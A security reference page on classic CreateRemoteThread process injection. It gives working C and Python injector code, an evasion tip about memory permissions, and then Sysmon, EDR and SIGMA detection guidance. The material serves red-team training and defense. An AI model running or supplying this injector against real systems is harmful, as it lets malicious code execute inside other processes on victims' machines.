# Classic Process Injection (CreateRemoteThread)

**MITRE ATT&CK**: T1055.002 - Process Injection: Portable Executable Injection

> **Authorized security testing only.** These code patterns are reference material
> for red team professionals operating under explicit written authorization.

## Overview

Classic process injection is the most straightforward injection technique. It follows
a four-step API pattern that allocates memory in a remote process, writes a payload
into that allocation, and starts a new thread to execute it. This is the most commonly
documented and most heavily detected injection method.

## The 4-Step API Pattern

```
OpenProcess  -->  VirtualAllocEx  -->  WriteProcessMemory  -->  CreateRemoteThread
 (get handle)    (allocate memory)    (write payload)          (execute payload)
```

## C Implementation

```c
#include <windows.h>
#include <stdio.h>

/*
 * Classic 4-step process injection via CreateRemoteThread.
 * Target: a process identified by PID.
 *
 * Required process access rights:
 *   PROCESS_VM_OPERATION  - needed for VirtualAllocEx
 *   PROCESS_VM_WRITE      - needed for WriteProcessMemory
 *   PROCESS_CREATE_THREAD - needed for CreateRemoteThread
 *   PROCESS_QUERY_INFORMATION - useful for validation
 */

int inject(DWORD targetPid, unsigned char *payload, SIZE_T payloadSize) {

    // ---------------------------------------------------------------
    // STEP 1: Open a handle to the target process.
    // This is the first indicator: cross-process handle with
    // VM_WRITE + CREATE_THREAD rights is highly suspicious.
    // Sysmon Event ID 10 logs this as a ProcessAccess event.
    // ---------------------------------------------------------------
    HANDLE hProcess = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD,
        FALSE,          // bInheritHandle
        targetPid       // dwProcessId
    );
    if (hProcess == NULL) {
        printf("[!] OpenProcess failed: %lu\n", GetLastError());
        return -1;
    }

    // ---------------------------------------------------------------
    // STEP 2: Allocate executable memory in the remote process.
    // PAGE_EXECUTE_READWRITE is a strong signal to EDRs -- legitimate
    // allocations rarely request RWX simultaneously.
    // Better tradecraft: allocate as RW, write, then VirtualProtectEx to RX.
    // ---------------------------------------------------------------
    LPVOID remoteBuffer = VirtualAllocEx(
        hProcess,
        NULL,                    // lpAddress - let OS choose
        payloadSize,             // dwSize
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE   // flProtect -- detected as suspicious
    );
    if (remoteBuffer == NULL) {
        printf("[!] VirtualAllocEx failed: %lu\n", GetLastError());
        CloseHandle(hProcess);
        return -1;
    }

    // ---------------------------------------------------------------
    // STEP 3: Write the payload into the allocated remote memory.
    // WriteProcessMemory is monitored by most EDRs via ntdll hooks
    // (NtWriteVirtualMemory). The combination of cross-process write
    // to executable memory is a high-confidence indicator.
    // ---------------------------------------------------------------
    SIZE_T bytesWritten = 0;
    BOOL result = WriteProcessMemory(
        hProcess,
        remoteBuffer,    // lpBaseAddress in remote process
        payload,         // lpBuffer - source data
        payloadSize,     // nSize
        &bytesWritten    // lpNumberOfBytesWritten
    );
    if (!result || bytesWritten != payloadSize) {
        printf("[!] WriteProcessMemory failed: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return -1;
    }

    // ---------------------------------------------------------------
    // STEP 4: Create a remote thread at the payload address.
    // This is Sysmon Event ID 8 (CreateRemoteThread). This single
    // event is one of the highest-fidelity injection indicators.
    // The start address pointing to unbacked (non-module) memory
    // is an additional strong signal.
    // ---------------------------------------------------------------
    HANDLE hThread = CreateRemoteThread(
        hProcess,
        NULL,                    // lpThreadAttributes
        0,                       // dwStackSize (default)
        (LPTHREAD_START_ROUTINE)remoteBuffer,  // lpStartAddress
        NULL,                    // lpParameter
        0,                       // dwCreationFlags (run immediately)
        NULL                     // lpThreadId
    );
    if (hThread == NULL) {
        printf("[!] CreateRemoteThread failed: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return -1;
    }

    // Wait for payload execution to complete (optional)
    WaitForSingleObject(hThread, INFINITE);

    // Cleanup
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    return 0;
}
```

## Python (ctypes) Equivalent

```python
import ctypes
from ctypes import wintypes

kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)

# Access rights constants
PROCESS_ALL_ACCESS = 0x001FFFFF
MEM_COMMIT_RESERVE = 0x00003000
PAGE_EXECUTE_READWRITE = 0x40

def inject(pid: int, payload: bytes) -> bool:
    """
    Classic 4-step injection using ctypes.
    Each step mirrors the C version above.
    """
    # Step 1: OpenProcess
    h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    if not h_process:
        raise ctypes.WinError(ctypes.get_last_error())

    # Step 2: VirtualAllocEx
    remote_buf = kernel32.VirtualAllocEx(
        h_process, None, len(payload), MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE
    )
    if not remote_buf:
        kernel32.CloseHandle(h_process)
        raise ctypes.WinError(ctypes.get_last_error())

    # Step 3: WriteProcessMemory
    written = ctypes.c_size_t(0)
    success = kernel32.WriteProcessMemory(
        h_process, remote_buf, payload, len(payload), ctypes.byref(written)
    )
    if not success:
        kernel32.CloseHandle(h_process)
        raise ctypes.WinError(ctypes.get_last_error())

    # Step 4: CreateRemoteThread
    h_thread = kernel32.CreateRemoteThread(
        h_process, None, 0, remote_buf, None, 0, None
    )
    if not h_thread:
        kernel32.CloseHandle(h_process)
        raise ctypes.WinError(ctypes.get_last_error())

    kernel32.WaitForSingleObject(h_thread, 0xFFFFFFFF)
    kernel32.CloseHandle(h_thread)
    kernel32.CloseHandle(h_process)
    return True
```

## Detection & Prevention

### Why This Is the Most Detected Technique

Classic injection uses a well-known, sequential API chain that every major EDR vendor
has signatures for. The combination of cross-process memory allocation, writing, and
thread creation generates multiple high-fidelity telemetry events.

### Sysmon Detection

**Event ID 10 (ProcessAccess)**: Fires when OpenProcess is called. Detection rules
filter on `GrantedAccess` values containing `0x1F0FFF` (PROCESS_ALL_ACCESS) or
combinations including `0x0020` (VM_WRITE) + `0x0008` (CREATE_THREAD).

```xml
<!-- Sysmon config rule for suspicious process access -->
<ProcessAccess onmatch="include">
    <GrantedAccess condition="is">0x1FFFFF</GrantedAccess>
    <GrantedAccess condition="is">0x1F3FFF</GrantedAccess>
    <GrantedAccess condition="is">0x143A</GrantedAccess>
</ProcessAccess>
```

**Event ID 8 (CreateRemoteThread)**: Fires specifically for CreateRemoteThread calls.
The `StartAddress` field pointing to non-module memory is a strong indicator. Detection
rules correlate `SourceImage` (injector) with `TargetImage` (target).

### EDR Behavioral Detection Points

1. **API Hook Chain**: EDRs hook NtAllocateVirtualMemory, NtWriteVirtualMemory, and
   NtCreateThreadEx in ntdll.dll. Seeing all three in sequence from the same process
   targeting a different process triggers behavioral alerts.

2. **RWX Memory Allocation**: PAGE_EXECUTE_READWRITE allocations in a remote process
   are rare in legitimate software. This alone is a medium-confidence indicator.

3. **Unbacked Executable Memory**: The thread start address in the target process
   pointing to memory not backed by any loaded module (DLL/EXE) is a high-confidence
   indicator used by most EDRs.

4. **Call Stack Analysis**: Advanced EDRs examine the call stack of the creating thread.
   Legitimate CreateRemoteThread calls originate from known system DLLs; calls from
   unbacked memory or unusual modules are flagged.

### Prevention Controls

- **Windows Defender Exploit Guard**: Attack Surface Reduction (ASR) rules can block
  process injection patterns.
- **Code Integrity Guard (CIG)**: Processes protected with CIG reject non-Microsoft
  signed code, blocking injection of unsigned payloads.
- **Credential Guard / PPL**: Protected Process Light prevents handle acquisition with
  the required access rights against protected processes.

### SIGMA Rule Example

```yaml
title: CreateRemoteThread into Unusual Target
status: experimental
logsource:
    product: windows
    category: create_remote_thread
detection:
    selection:
        EventID: 8
    filter:
        SourceImage|endswith:
            - '\svchost.exe'
            - '\csrss.exe'
    condition: selection and not filter
level: high
```
